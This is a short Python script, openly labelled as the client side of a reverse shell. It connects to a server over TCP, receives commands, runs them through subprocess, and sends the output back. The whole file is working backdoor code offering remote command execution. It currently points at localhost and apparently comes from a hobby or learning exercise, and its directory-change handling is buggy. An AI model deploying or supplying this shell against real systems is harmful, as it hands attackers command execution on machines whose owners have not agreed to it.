# Client for the reverse shell
import socket
import subprocess
import os
server = "127.0.0.1"
BUFFER = 1024*128
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connected = False
shell = True
command = ""
output = ""
while not connected:
    try:
        c = s.connect((server,80))
        connected = True
        print("Success!")
    except:
        print("server offline")
    

while shell:
    # receive the command from the server
    command = s.recv(BUFFER).decode()
    splited_command = command.split()
    print(splited_command)
    if command == "pwd":
        output = os.getcwd()
    elif command == "exit":
        
        break
    elif splited_command[0] == "cd":
        try:
            os.chdir(os.getcwd().join(splited_command[1:]))
            output = os.getcwd()
        except FileNotFoundError as e:
            output = str(e)
            
    else:
        output = subprocess.getoutput(command)
    print("output:\n",output)
    output +='\0'
    s.send(output.encode())

s.close()
